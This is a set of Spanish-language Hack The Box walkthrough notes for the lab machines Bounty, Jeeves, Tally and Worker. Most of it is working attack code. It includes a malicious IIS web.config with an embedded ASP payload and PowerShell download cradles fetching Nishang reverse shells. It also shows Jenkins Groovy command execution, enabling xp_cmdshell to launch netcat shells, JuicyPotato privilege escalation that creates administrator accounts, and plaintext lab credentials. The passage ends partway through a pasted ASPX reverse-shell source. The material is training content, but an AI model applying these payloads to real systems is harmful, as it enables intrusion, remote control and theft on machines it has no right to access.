Buscamos en internet sobre la busqueda `iis upload exploit`. Encontramos una pagina interesante en [ivoidwarranties](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/).
Uploadeando un fichero `web.config` podriamos ejecutar comandos a nivel de systema.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Lo subimos en la red y controlamos en la routa `http://10.10.10.93/uploadedFiles/web.config`

Aqui vemos que el codigo se a ejecutado. Ahora necessitamos ver si podemos ejecutar codigo a nivel de systema.

Buscamos en la pagina [Hacking Dream](https://www.hackingdream.net/search?q=reverse) un one linear que nos permite entablar una reverse
shell con ASP.

La añadimos al web.config y la modificamos.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("ping 10.10.14.7")
output = cte.StdOut.Readall()
Response.write(output)
%>
-->
```

Nos ponemos en escucha de trazas ICMP `tcpdump -i tun0 icmp -n` y enviamos el fichero nuevamente y vemos que recibimos la traza ICMP.

<!--chapter:end:29-Bounty/29-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con un web.config {-}

Aqui trabajaremos con Nishang porque nos queremos entablar una PowerShell.

1. Descargamos Nishang y modificamos el fichero de reverse shell por tcp

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang/Shells
    cp Invoke-PowerShellTcp.ps1 ../../PS.ps1
    cd ../..
    nano PS.ps1
    ```

    Modificamos el fichero PS.ps1 para añadir `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443` al final del fichero

1. Modificamos el web.config para que descarge el fichero PS.ps1 al momento que lo lanzemos.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
        </handlers>
        <security>
            <requestFiltering>
                <fileExtensions>
                <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                <remove segment="web.config" />
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
    </configuration>
    <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
    <%
    Set co = CreateObject("WScript.Shell")
    Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')")
    output = cte.StdOut.Readall()
    Response.write(output)
    %>
    -->
    ```

1. Uploadeamos el fichero en la web

1. Lanzamos un servidor web con pyhton

    ```bash
    python -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Navigamos al url `http://10.10.10.93/uploadedFiles/web.config`

Y vemos que ganamos accesso al systema

```bash
whoami

#Output
bounty\merlin
```

<!--chapter:end:29-Bounty/29-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
systeminfo
whoami /priv
```

Aqui vemos que tenemos el `SeImpersonatePrivilege` ;)

Tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.7/JuicyPotato.exe -OutFile JuicyPotato.exe
iwr -uri http://10.10.14.7/nc.exe -OutFile nc.exe
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Nos connectamos con el servicio nc con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.7 443"
```

Aqui nos sale une error 10038. Esto suele passar cuando el CLSID no es el correcto. Como savemos con el systeminfo
que estamos en una maquina Windows10 Enterprise, podemos buscar el CLSID correcto en [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
encontramos el CLSID que corresponde y con el parametro `-c`

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.7 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
```

La reverse shell nos a functionnado y con `whoami` vemos que ya somos nt authority\system y podemos ver la flag.


<!--chapter:end:29-Bounty/29-04-PrivilegeEscalation.Rmd-->

# Jeeves {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Jeeves.

El replay del live se puede ver aqui

[![S4vitaar Jeeves maquina](https://img.youtube.com/vi/-o1c3s1QKUg/0.jpg)](https://www.youtube.com/watch?v=-o1c3s1QKUg)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:30-Jeeves/30-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.63
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.63
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.63 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,445,50000 10.10.10.63 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web, Fuzzing       |            |
| 135    | msrpc    |                    |            |
| 445    | smb      | Null session       |            |
| 50000  | http     | Web, Fuzzing       |            |

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.63
smbclient -L 10.10.10.63 -N
smbmap -H 10.10.10.63 -u 'null'
```

Solo hemos podido comprobar que estamos frente a una maquina windows 10 pero poco mas.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.63
```

Estamos en frente de un IIS

#### Analyzando la web con Firefox {-}

Vemos una pagina de busqueda typo Google.

Buscando en internet vemos una routa potencial que seria `/askjeeves/` pero no nos da en este caso

Intentamos ver lo que hay en el puerto **50000** y tenemos un 404. Si le ponemos el `/askjeeves/`, llegamos en 
un panel de administration de Jenkins.




<!--chapter:end:30-Jeeves/30-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Vulnerabilidad Jenkins {-}

Teniendo accesso al panel de administracion de Jenkins es un problema ademas si hay en el menu el boton Administrar Jenkins.
Aqui es el caso.

Pinchamos a Administrar Jenkins y despues le damos a Consola de scripts.

Aqui podemos crear Groovy script

```bash
command = "whoami"
println(command.execute().text)
```

Si ejecutamos el commando vemos en la respuesta `jeeves\kohsuke`. Vemos con esto que tenemos capacidad de RCE.


<!--chapter:end:30-Jeeves/30-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Jenkins Consola de scripts {-}

1. Descargamos Nishang y modificamos el fichero de reverse shell por tcp

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang/Shells
    cp Invoke-PowerShellTcp.ps1 ../../PS.ps1
    cd ../..
    nano PS.ps1
    ```

    Modificamos el fichero PS.ps1 para añadir `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443` al final del fichero

1. Compartimos un servicio http con python

    ```bash
    python3 -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Creamos el Groovy script

    ```bash
    command = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')"
    println(command.execute().text)
    ```

Ya hemos ganado accesso al systema. `whoami` -> **jeeves\kohsuke**. Ya podemos leer la flag.

<!--chapter:end:30-Jeeves/30-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
systeminfo
whoami /priv
```

Aqui vemos que tenemos el `SeImpersonatePrivilege` ;)

Tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.7/JuicyPotato.exe -OutFile JuicyPotato.exe
```

Nos creamos un nuevo usuario con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar s4vitar1234$! /add"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators s4vitar /add"
```

Si comprobamos con el commando `crackmapexec smb 10.10.10.63 -u 's4vitar' -p 's4vitar1234$!'` Vemos que el usuario no esta pwned.
Aqui tenemos que 

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Si comprobamos otra vez con crackmapexec, vemos ahora que el usuario s4vitar esta pwned.
Ya nos podemos connectar con psexec

```bash
impacket-psexec WORKGROUP/s4vitar@10.10.10.63 cmd.exe
Password: s4vitar1234$!

whoami

#Output
nt authority\system

cd C:\Users\Adminstrator\Desktop
dir
type hm.txt
```

Aqui nos dice que la flag no esta aqui. Pensamos a Alternative Data Streams.

```bash
dir /r
more < hm.txt:root.txt
```

;)

<!--chapter:end:30-Jeeves/30-04-PrivilegeEscalation.Rmd-->

# Tally {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Tally.

El replay del live se puede ver aqui

[![S4vitaar Tally maquina](https://img.youtube.com/vi/zcdqHfdxIZI/0.jpg)](https://www.youtube.com/watch?v=zcdqHfdxIZI)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:31-Tally/31-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.59
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.59
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.59 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.59 -oN targeted
```


| Puerto | Servicio      | Que se nos occure?             | Que falta?   |
| ------ | ------------- | ------------------------------ | ------------ |
| 21     | ftp           | Conexion como Anonymous        |              |
| 80     | http          | Web, Fuzzing                   |              |
| 81     | http          | Web, Fuzzing                   |              |
| 135    | msrpc         |                                |              |
| 139    | netbios       |                                |              |
| 445    | smb           | Null session                   |              |
| 808    | ccproxy-http? |                                |              |
| 1433   | ms-sql-s      |                                |              |
| 5985   | WinRM         | evil-winrm                     | credenciales |
| 15567  | http          | Web, Fuzzing                   |              |
| 32843  | mc-nmf        | Puertos por defecto de windows |              |
| 32844  | mc-nmf        | Puertos por defecto de windows |              |
| 32846  | mc-nmf        | Puertos por defecto de windows |              |
| 47001  | http          | Puertos por defecto de windows |              |
| 49664  | msrpc         | Puertos por defecto de windows |              |
| 49665  | msrpc         | Puertos por defecto de windows |              |
| 49666  | msrpc         | Puertos por defecto de windows |              |
| 49667  | msrpc         | Puertos por defecto de windows |              |
| 49668  | msrpc         | Puertos por defecto de windows |              |
| 49669  | msrpc         | Puertos por defecto de windows |              |
| 49670  | msrpc         | Puertos por defecto de windows |              |

### Conexion Anonymous con ftp {-}

```bash
ftp 10.10.10.59

Name: anonymous
Password: 

User cannot login
```

El usuario anonymous no esta habilitado.

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.59
smbclient -L 10.10.10.59 -N
```

Vemos que estamos en frente de una maquina Windows Server 2016 Standard de 64 bit pro que se llama **TALLY** en el dominio **TALLY**.
No podemos connectarnos con un NULL Session.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.59
```

Nos enfrentamos a un Microsoft Sharepoint con un IIS 10.0


#### Analyzando la web con Firefox {-}

Entramos en un panel Sharepoint y vemos en la url que hay un `_layouts`

Buscamos en google por la palabra `sharepoint pentest report` y encontramos la web de [pentest-tool](https://pentest-tools.com/public/sample-reports/sharepoint-scan-sample-report.pdf). Esto




<!--chapter:end:31-Tally/31-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Sharepoint `_layouts` {-}

El enlaze de la pagina web es un reporte donde se pueden ver routas interesantes detectadas durante un processo de auditoria.

- http://sharepointtarget.com//_layouts/viewlsts.aspx
- http://sharepointtarget.com//_layouts/userdisp.aspx
- http://sharepointtarget.com//_layouts/userdisp.aspx?ID=1
- http://sharepointtarget.com//_layouts/aclinv.aspx
- http://sharepointtarget.com//_layouts/bpcf.aspx
- http://sharepointtarget.com//_layouts/groups.aspx
- http://sharepointtarget.com//_layouts/help.aspx
- http://sharepointtarget.com//_layouts/mcontent.aspx
- http://sharepointtarget.com//_layouts/mobile/mbllists.aspx
- http://sharepointtarget.com//_layouts/people.aspx?MembershipGroupId=0
- http://sharepointtarget.com//_layouts/recyclebin.aspx
- http://sharepointtarget.com//_layouts/spcf.aspx

Si vamos a la url `http://10.10.10.59/_layouts/viewlsts.aspx` ya vemos cosas interesantes. Si pinchamos en Shared Documents podemos ver un documento
llamado ftp-details y si pinchamos en Site Pages vemos un fichero FinanceTeam. Nos los descargamos.

Si abrimos el fichero `ftp-details.docx` con libre office vemos una contraseña. Si miramos la pagina FinanceTeam, vemos un mensaje donde podemos ver
usuarios potenciales y un ftp account name.

### Conneccion con FTP {-}

```bash
ftp 10.10.10.59
Name: ftp_user
Password: UTDRSCH3c"$6hys
```

Hemos podido authenticarnos. Si le damos a `dir` vemos muchos directorios. Si es el caso, S4vi nos propone usar de la Heramienta `curlftpfs` para montarnos
una montura por ftp

```bash
apt install curlftpfs
mkdir /mnt/ftp
curlftpfs ftp_user:'UTDRSCH3c"$6hys'@10.10.10.59 /mnt/ftp
cd /mnt/ftp
tree
```

Aqui vemos un fichero `tim.kdbx`. Es interesante porque los ficheros **KDBX** son ficheros KeePass y suelen tener informaciones interesantes como contraseñas.

```bash
cp User/Tim/Files/tim.kdbx /home/s4vitar/Desktop/S4vitar/Tally/content/.
cd !$
chmod 644 tim.kdbx
apt install keepassxc
```

Si lanzamos el KeePassxc y que le damos a abrir una base de datos existente, buscamos el fichero `tim.kdbx` vemos que nos pide una contraseña.
En este caso bamos a lanzar un keepass2john para crackear la contraseña.

### Crackeando un fichero KDBX con keepass2john {-}

```bash
keepass2john tim.kdbx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya tenemos la contraseña. Podemos abrir el fichero KDBX con Keepassxc y aqui ya encontramos una credencial por el usuario Finance.
Vamos a checkear los recursos compartidos a nivel de red con este usuario.

### SMB {-}

```bash
smbclient -L 10.10.10.59 -U "Finance%Acc0unting"
smbclient //10.10.10.59/ACCT -U "Finance%Acc0unting" -c "dir"
```

Tenemos accesso a un nuevo directorio pero contiene muchos otros directorios. Nos creamos otra montura

```bash
mkdir /mnt/smb
mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,domain=WORKGROUP,rw
cd /mnt/smb
tree
```

Aqui vemos que hay ficheros ejecutables en la carpeta `zz_Migration/Binaries/New Folder/` y un binario llamado `tester.exe` nos
llama la attencion.

```bash
cp "/mnt/smb/zz_Migration/Binaries/New Folder/tester.exe" /home/s4vitar/Desktop/content
cd /home/s4vitar/Desktop/content
file tester.exe
```

Vemos que es un ejecutable windows. Lo vamos a analyzar con radare2 para saber lo que hace a bajo nivel


### EXE analysis con radare2 {-}

```bash
radare2 tester.exe
> aaa
> s main
> pdf
```

Bueno aqui podemos ver un usuario y una contraseña para la base de datos MS-SQL 

> [ ! ]NOTAS: tambien se podria usar el commando `strings tester.exe | grep "PWD" | tr ';' '\n' | batcat`

### Conneccion a la base de datos {-}

```bash
sqsh -S 10.10.10.59 -U 'sa'
password: ********
```

Es valida y estamos connectado a la base de datos

```bash
xp_cmdshell "whoami"
go
```

El commando xp_cmdshell a sido desactivado. Vamos a activar la possiblidad de ejecutar commandos.

```bash
sp_configure "show advanced options", 1
reconfigure
go

sp_configure "xp_cmdshell", 1
reconfigure
go
```

Ya podemos ejectuar commandos

```bash
xp_cmdshell "whoami"
go

#Output
tally\sarah
```

> [ ! ]NOTAS: tambien se podria usar el commando `impacker-mssqlclient WORKGROUP/sa@10.10.10.59` y con este commando no tendriamos que darle siempre a go.

Como tenemos possiblidad de ejecutar commandos a nivel de systema, nos vamos a connectar a la maquina.

<!--chapter:end:31-Tally/31-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con MS-SQL {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Compartimos el binario nc.exe

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe .
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. Desde el ms-sql

    ```bash
    xp_cmdshell "\\10.10.14.7\smbFolder\nc.exe -e cmd 10.10.14.7 443"
    ```

Ya hemos ganado accesso al systema como el usuario Sarah y podemos ver la flag


<!--chapter:end:31-Tally/31-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
systeminfo
whoami /priv
```

Aqui vemos que tenemos el `SeImpersonatePrivilege` ;)

Tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.7/JuicyPotato.exe -OutFile JuicyPotato.exe
```

Nos creamos un nuevo usuario con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar s4vitar1234$! /add"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators s4vitar /add"
```

Si comprobamos con el commando `crackmapexec smb 10.10.10.59 -u 's4vitar' -p 's4vitar1234$!'` Vemos que el usuario no esta pwned.
Aqui tenemos que 

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Si comprobamos otra vez con crackmapexec, vemos ahora que el usuario s4vitar esta pwned.
Ya nos podemos connectar con psexec

```bash
impacket-psexec WORKGROUP/s4vitar@10.10.10.59 cmd.exe
Password: s4vitar1234$!

whoami

#Output
nt authority\system

cd C:\Users\Adminstrator\Desktop
dir
type hm.txt
```

Aqui nos dice que la flag no esta aqui. Pensamos a Alternative Data Streams.

```bash
dir /r
more < hm.txt:root.txt
```

;)

<!--chapter:end:31-Tally/31-04-PrivilegeEscalation.Rmd-->

# Worker {-}

## Introduccion {-}

La maquina del dia 23/08/2021 se llama Worker.

El replay del live se puede ver aqui

[![S4vitaar Worker maquina](https://img.youtube.com/vi/PEth2wravLQ/0.jpg)](https://www.youtube.com/watch?v=PEth2wravLQ)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:32-Worker/32-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.203
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.203
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.203 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,3690,5985 10.10.10.203 -oN targeted
```


| Puerto | Servicio      | Que se nos occure?             | Que falta?   |
| ------ | ------------- | ------------------------------ | ------------ |
| 80     | http          | Web, Fuzzing                   |              |
| 3690   | svnserve      |                                |              |
| 5985   | WinRM         | evil-winrm                     | credenciales |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.203
```

Nos enfrentamos a un Microsoft IIS 10.0

### Analyzando svnserve {-}

La primera cosa que hay que hacer es buscar en internet lo que svn es. Tambien vamos buscando si es possible enumerar
un servicio svn.

```bash
which svn
svn -h
svn checkout svn://10.10.10.203
```

Aqui vemos que nos a cargado dos ficheros, como uno de ellos se llama `dimension.worker.htb` pensamos que se esta aplicando virtual hosting. En el 
fichero `moved.txt` vemos a demas otro dominio.
Añadimos al `/etc/hosts` los dominios `worker.htb dimension.worker.htb devops.worker.htb`.

### Analyzando la web con Firefox {-}

Entramos en el panel IIS por defecto. Si lanzamos `http://worker.htb` sigue siendo lo mismo. Si le damos a `http://dimension.worker.htb` entramos
a una nueva web y si vamos al url `http://devops.worker.htb` hay un panel de session.

Aqui necessitamos credenciales, tenemos que volver al analysis de **svnserve** para ver si encontramos mas cosas

### Siguiendo el analysis svnserve {-}

```bash
svn checkout --help
```

Aqui vemos que hay un parametro de revision que por defecto esta a 1, miramos que pasa cuando le damos a 2

```bash
svn checkout -r 2 svn://10.10.10.203
cat deploy.ps1
```

Vemos algo nuevo, un fichero `deploy.ps1` y ya nos lo a descargado. Aqui ya vemos credenciales.

Intentamos connectar con **evil-winrm** pero no podemos. Vamos a por el panel de session de `http://devops.worker.htb` y aqui ya hemos podido
arrancar session. Es un Azure DevOps.

### Vulnerar un Azur DevOps {-}

Si navigamos en la web podemos ver multiples repositorios.

<div class="figure">
<img src="images/Worker-repos.png" alt="Azure DevOps repositories" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-58)Azure DevOps repositories</p>
</div>

Lo que nos llama la atencion aqui es el echo que hay un repositorio llamado dimension, y como existe un dominio `dimension.worker.htb`, pensamos que
los repositorios corresponden a proyectos relacionados con subdominios. Si añadimos el subdominio `alpha.worker.htb` en el `/ect/hosts` y que miramos con
el firefox a esta url vemos el proyecto. 

Si analysamos mas el proyecto, vemos que no podemos alterar el proyecto en la rama Master, y vemos que hay Pipelines que se lanzan automaticamente. Analysando 
el script de la Pipeline, vemos que no esta atada a la rama master.

Creamos una rama al proyecto y le ponemos nuestro codigo malicioso copiada del github de [borjmz aspx reverse shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)









<!--chapter:end:32-Worker/32-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


Si navigamos en la web podemos ver multiples repositorios.

<div class="figure">
<img src="images/Worker-repos.png" alt="Azure DevOps repositories" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-59)Azure DevOps repositories</p>
</div>

Lo que nos llama la atencion aqui es el echo que hay un repositorio llamado dimension, y como existe un dominio `dimension.worker.htb`, pensamos que
los repositorios corresponden a proyectos relacionados con subdominios. Si añadimos el subdominio `alpha.worker.htb` en el `/ect/hosts` y que miramos con
el firefox a esta url vemos el proyecto. 

Si analysamos mas el proyecto, vemos que no podemos alterar el proyecto en la rama Master, y vemos que hay Pipelines que se lanzan automaticamente. Analysando 
el script de la Pipeline, vemos que no esta atada a la rama master.

Creamos una rama al proyecto y le vamos a poner un codigo malicioso.


<!--chapter:end:32-Worker/32-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Azure DevOps {-}

Una vez la nueva rama creada, le ponemos nuestro codigo malicioso copiada del github de [borjmz aspx reverse shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
	protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "10.10.14.7"; //CHANGE THIS
            int port = 443; ////CHANGE THIS
                
        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

